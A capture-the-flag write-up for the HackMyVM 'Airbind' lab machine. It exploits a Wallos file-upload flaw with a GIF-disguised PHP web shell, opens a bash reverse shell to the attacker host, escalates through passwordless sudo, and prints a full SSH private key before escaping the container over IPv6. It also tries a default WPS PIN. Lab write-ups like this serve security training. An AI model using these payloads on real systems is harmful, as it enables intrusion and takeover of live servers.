# Airbind

## Recon

```bash
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.87
```

::: details nmap_scan.log.md
```log
Open 10.0.2.87:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.87
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.57 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 81452C705B6AAB657F745B6FB4966367
|_http-server-header: Apache/2.4.57 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Wallos - Subscription Tracker
|_Requested resource was login.php
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/airbind/writeup.png)

```bash
└─$ feroxbuster -u http://10.0.2.87 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
302      GET        0l        0w        0c http://10.0.2.87/ => login.php
200      GET        7l        7w      118c http://10.0.2.87/.gitignore
302      GET        0l        0w        0c http://10.0.2.87/about.php => login.php
200      GET        0l        0w        0c http://10.0.2.87/auth.php
200      GET        4l       36w      410c http://10.0.2.87/cronjobs
301      GET        9l       28w      303c http://10.0.2.87/db => http://10.0.2.87/db/
301      GET        9l       28w      307c http://10.0.2.87/images => http://10.0.2.87/images/
301      GET        9l       28w      309c http://10.0.2.87/includes => http://10.0.2.87/includes/
302      GET        0l        0w        0c http://10.0.2.87/index.php => login.php
301      GET        9l       28w      305c http://10.0.2.87/libs => http://10.0.2.87/libs/
302      GET        0l        0w        0c http://10.0.2.87/logout.php => .
200      GET       61l      159w     1977c http://10.0.2.87/logos.php
200      GET        5l       30w    30457c http://10.0.2.87/images/icon/favicon.ico
200      GET       42l      110w     1924c http://10.0.2.87/login.php
301      GET        9l       28w      312c http://10.0.2.87/screenshots => http://10.0.2.87/screenshots/
301      GET        9l       28w      308c http://10.0.2.87/scripts => http://10.0.2.87/scripts/
302      GET        0l        0w        0c http://10.0.2.87/settings.php => login.php
302      GET        0l        0w        0c http://10.0.2.87/stats.php => login.php
301      GET        9l       28w      307c http://10.0.2.87/styles => http://10.0.2.87/styles/
200      GET       80l      183w     2569c http://10.0.2.87/manifest.json
302      GET        0l        0w        0c http://10.0.2.87/registration.php => login.php
301      GET        9l       28w      310c http://10.0.2.87/endpoints => http://10.0.2.87/endpoints/
```

```bash
└─$ curl 'http://10.0.2.87/.gitignore'
/db/*
!/db/wallos.empty.db
/images/uploads/logos/*
!/images/uploads/logos/wallos.png
.DS_Store
.idea/
.vscode/

└─$ curl 'http://10.0.2.87/db/wallos.db' -sO

└─$ sqlite3 wallos.db '.tables'
categories                     login_tokens
currencies                     migrations
cycles                         notifications
fixer                          payment_methods
frequencies                    settings
household                      subscriptions
last_exchange_update           user
last_update_next_payment_date

└─$ sqlite3 wallos.db 'SELECT * FROM user' --box
┌────┬──────────┬─────────────────────┬──────────────────────────────────────────────────────────────┬───────────────┬────────┬──────────┐
│ id │ username │        email        │                           password                           │ main_currency │ avatar │ language │
├────┼──────────┼─────────────────────┼──────────────────────────────────────────────────────────────┼───────────────┼────────┼──────────┤
│ 1  │ admin    │ admin@localhost.com │ $2y$10$2XxuEupev6gU1qWoURsIYu7XHNiy7nve9iq7H0mUX/MzFnmvbxC9S │ 1             │ 0      │ en       │
└────┴──────────┴─────────────────────┴──────────────────────────────────────────────────────────────┴───────────────┴────────┴──────────┘
```

FFFFFFFFFFk
```powershell
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
admin            (admin)
```

```bash
└─$ curl -s 'http://10.0.2.87/login.php' | grep -inE 'Wallos|\?v'
7:    <title>Wallos - Subscription Tracker</title>
11:    <link rel="stylesheet" href="styles/login.css?v1.11.0">
13:    <link rel="stylesheet" href="styles/login-dark-theme.css?v1.11.0" id="dark-theme" disabled>
19:                 <img src="images/wallossolid.png" alt="Wallos Logo" title="Wallos - Subscription Tracker" />                 <p>
```

### RCE

[Wallos < 1.11.2 - File Upload RCE](https://www.exploit-db.com/exploits/51924)

```bash
└─$ echo 'GIF89;<?php system($_REQUEST[0]) ?>' > shell.php
└─$ curl 'http://10.0.2.87/endpoints/subscription/add.php' \
  -H 'Cookie: PHPSESSID=80b6h7d73vqjrbvo9tpecrq1a7; language=en; theme=light' \
  -F 'name=Test2' \
  -F 'logo=@shell.php;type=image/gif' \
  -F 'logo-url=' \
  -F 'id=' \
  -F 'price=0.01' \
  -F 'currency_id=1' \
  -F 'frequency=1' \
  -F 'cycle=3' \
  -F 'next_payment=2025-10-17' \
  -F 'payment_method_id=1' \
  -F 'category_id=1' \
  -F 'payer_user_id=1' \
  -F 'url=' \
  -F 'notes='
{"status":"Success","message":"Subscription added successfully"} 
```

![writeup-1.png](/assets/pentest/hackmyvm/airbind/writeup-1.png)

```bash
└─$ curl 'http://10.0.2.87/images/uploads/logos/1760646492-Test2.php' --data-urlencode '0=id'
GIF89;uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reverse Shell (www-data)

### Lateral Movement (root) (container)

```bash
└─$ curl 'http://10.0.2.87/images/uploads/logos/1760646492-Test2.php' --data-urlencode '0=/bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1" '
---
└─$ pwncat-cs -lp 4444
(remote) www-data@ubuntu:/var/www/html/images/uploads/logos$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
(remote) www-data@ubuntu:/var/www/html/images/uploads/logos$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL
(remote) www-data@ubuntu:/var/www/html/images/uploads/logos$ sudo su
root@ubuntu:/var/www/html/images/uploads/logos# id
uid=0(root) gid=0(root) groups=0(root)
```

#### User.txt

```bash
root@ubuntu:~# cat user.txt
4408f370877687429c6ab332e6f560d0
```

### Docker escape

Usually containers don't have access to Wireless Interfaces,  however it's down.
```bash
root@ubuntu:/var/www/html/images/uploads/logos# ip -brief a s
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0@if8         UP             10.0.3.241/24 fe80::dea1:f7ff:fe82:7613/64
wlan0            DOWN
ap0              DOWN
```

`id_rsa` exists, but we can't connect to port 22.
```bash
root@ubuntu:~/.ssh# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
EkGwPez9XGBEUAAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
```

nmap shows it's filtered, not disabled. We can try SSH-ing with IPv6 protocol
```bash
└─$ ping6 -I eth0 -c 10 ff02::1 | grep 'bytes from' | cut -d' ' -f4 | sort | uniq -c
ping6: Warning: source address might be selected on device other than: eth0
      9 fe80::a00:27ff:fea4:1221%eth0:
     10 fe80::c8d0:1e99:530b:fb94%eth0:
```

Success
```bash
└─$ ssh -i id_rsa.root root@fe80::a00:27ff:fea4:1221%eth0
root@airbind:~# id
uid=0(root) gid=0(root) groupes=0(root)
```

### Root.txt

```
root@airbind:~# cat root.txt
2bd693135712f88726c22770278a2dcf
```

## Proper Priv Esc **TRY**

While going over writeups I noticed that there was a second way, and most probably the intended route to exploit the machine.
- [https://hgbe02.github.io/Hackmyvm/Airbind.html](https://hgbe02.github.io/Hackmyvm/Airbind.html)

Since we are root we can turn the interface on!
```bash
root@ubuntu:~# ip link set wlan0 up
root@ubuntu:~# iwlist wlan0 scanning
wlan0     Scan completed :
          Cell 01 - Address: 02:00:00:00:01:00
                    Channel:7
                    Frequency:2.442 GHz (Channel 7)
                    Quality=70/70  Signal level=-30 dBm
                    Encryption key:on
                    ESSID:"TL-WR842ND"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=0006423b8016ab73
                    Extra: Last beacon: 96ms ago
                    IE: Unknown: 000A544C2D57523834324E44
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030107
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400400200000040
                    IE: Unknown: DDA90050F204104A00011010440001021041000101101200020000105300022108103B00010310470010572CF82FC95756539B16B5CFB298ABF11021000754502D4C494E4B1023000A544C2D57523834324E4410240001201042001D51514848302D36465943582D45515A52502D4C585642302D37423848531054000800010050F20400011011000A544C2D57523834324E441008000221081049000E00372A0001200106FFFFFFFFFFFF
```

[What Are The Default WPS PINs of TP-Link Routers - Quora](https://www.scribd.com/document/448977689/What-are-the-default-WPS-PINs-of-TP-Link-routers-Quora)
- Router Model: TL-WR842ND
- WPS-PIN: 55114217

Start WPA
```bash
root@ubuntu:/tmp# echo $'ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\nupdate_config=1' | tee /etc/wpa_supplicant/wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1
root@ubuntu:/tmp# chmod 600 /etc/wpa_supplicant/wpa_supplicant.conf
root@ubuntu:/tmp# wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
```

Use `wpa_cli` to enable `wlan0`
```bash
root@ubuntu:/tmp# wpa_cli
wpa_cli v2.10
Copyright (c) 2004-2022, Jouni Malinen <j@w1.fi> and contributors

This software may be distributed under the terms of the BSD license.
See README for more details.


Selected interface 'wlan0'

Interactive mode

> help
commands:
  status [verbose] = get current WPA/EAPOL/EAP status
  ifname = get current interface name
  ping = pings wpa_supplicant
...
  wps_pbc [BSSID] = start Wi-Fi Protected Setup: Push Button Configuration
  wps_pin <BSSID> [PIN] = start WPS PIN method (returns PIN, if not hardcoded)
  wps_check_pin <PIN> = verify PIN checksum
...

> wps_pin any 55114217
55114217
<3>CTRL-EVENT-NETWORK-ADDED 0
<3>WPS-PIN-ACTIVE
<3>CTRL-EVENT-SCAN-STARTED
<3>CTRL-EVENT-SCAN-RESULTS
<3>WPS-AP-AVAILABLE-AUTH
<3>SME: Trying to authenticate with 02:00:00:00:01:00 (SSID='TL-WR842ND' freq=2442 MHz)
<3>Trying to associate with 02:00:00:00:01:00 (SSID='TL-WR842ND' freq=2442 MHz)
<3>Associated with 02:00:00:00:01:00
<3>CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
<3>CTRL-EVENT-EAP-STARTED EAP authentication started
<3>CTRL-EVENT-EAP-STATUS status='started' parameter=''
<3>CTRL-EVENT-EAP-PROPOSED-METHOD vendor=14122 method=1
<3>CTRL-EVENT-EAP-STATUS status='accept proposed method' parameter='WSC'
<3>CTRL-EVENT-EAP-METHOD EAP vendor 14122 method 1 (WSC) selected
<3>WPS-FAIL msg=10 config_error=18
<3>CTRL-EVENT-EAP-STATUS status='completion' parameter='failure'
<3>CTRL-EVENT-EAP-FAILURE EAP authentication failed
<3>CTRL-EVENT-DISCONNECTED bssid=02:00:00:00:01:00 reason=3 locally_generated=1
<3>CTRL-EVENT-DSCP-POLICY clear_all
<3>CTRL-EVENT-SCAN-STARTED
<3>CTRL-EVENT-NETWORK-REMOVED 0
<3>CTRL-EVENT-SCAN-RESULTS
<3>WPS-AP-AVAILABLE-PIN
<3>CTRL-EVENT-NETWORK-NOT-FOUND
```

Interface doesn't have IP, but we can give it one. DHCP failed to automatically assign an IP.
```bash
root@ubuntu:~# dhclient wlan0 -v
```

```bash
# Set static IP
sudo ip addr add 192.168.1.100/24 dev wlan0

# Bring interface up
sudo ip link set wlan0 up

# Check static IP
root@ubuntu:~# ip -brief a s wlan0
wlan0            DOWN           192.168.1.100/24

# Hmmm interface down...
```

At this point I was not able to enable interface, scan it or interact with it.

The idea is to use WiFI connection to reach the Host via SSH, since the firewall blocks the access from outside.

